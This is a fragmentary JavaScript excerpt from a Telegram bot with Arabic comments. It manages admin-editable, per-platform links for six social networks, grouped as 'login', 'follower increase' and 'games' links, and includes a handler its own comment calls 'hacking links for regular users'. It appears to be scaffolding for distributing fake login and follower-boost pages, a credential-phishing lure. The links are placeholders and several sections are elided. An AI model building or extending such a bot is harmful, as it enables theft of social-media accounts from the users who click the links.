...
// --- نظام إدارة روابط الصفحات المحدث (واجهة ثلاثية الأقسام) ---

// تخزين الروابط (كل منصة لها رابطين منفصلين)
let pageLinks = {
    // روابط تسجيل الدخول
    login: {
        instagram: 'https://default-link.com/instagram/login',
        tiktok: 'https://default-link.com/tiktok/login',
        youtube: 'https://default-link.com/youtube/login',
        snapchat: 'https://default-link.com/snapchat/login',
        twitter: 'https://default-link.com/twitter/login',
        facebook: 'https://default-link.com/facebook/login'
    },
    // روابط زيادة المتابعين
    increase: {
        instagram: 'https://default-link.com/instagram/increase',
        tiktok: 'https://default-link.com/tiktok/increase',
        youtube: 'https://default-link.com/youtube/increase',
        snapchat: 'https://default-link.com/snapchat/increase',
        twitter: 'https://default-link.com/twitter/increase',
        facebook: 'https://default-link.com/facebook/increase'
    },
    // روابط الألعاب
    games: {
...
// دالة مساعدة لإرجاع اسم المنصة بالعربية
...
bot.on('callback_query', async (query) => {
    ...
    if ((data.startsWith('section_') || data.startsWith('edit_link_')) && !isAdmin(userId)) {
        return bot.answerCallbackQuery(query.id, { text: '❌ غير مصرح', show_alert: true });
    }

    // ===== عرض أزرار المنصات حسب القسم =====
...
// ===== معالج روابط الاختراق للمستخدمين العاديين =====
// هذا الجزء مخصص للأزرار التي تظهر للمستخدمين العاديين في البوت

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // تجاهل إذا كان هذا معالج خاص بالمشرفين
    if (data.startsWith('section_') || data.startsWith('edit_link_') || data === 'back_to_sections') {
        return;
    }

    // معالج روابط تسجيل الدخول
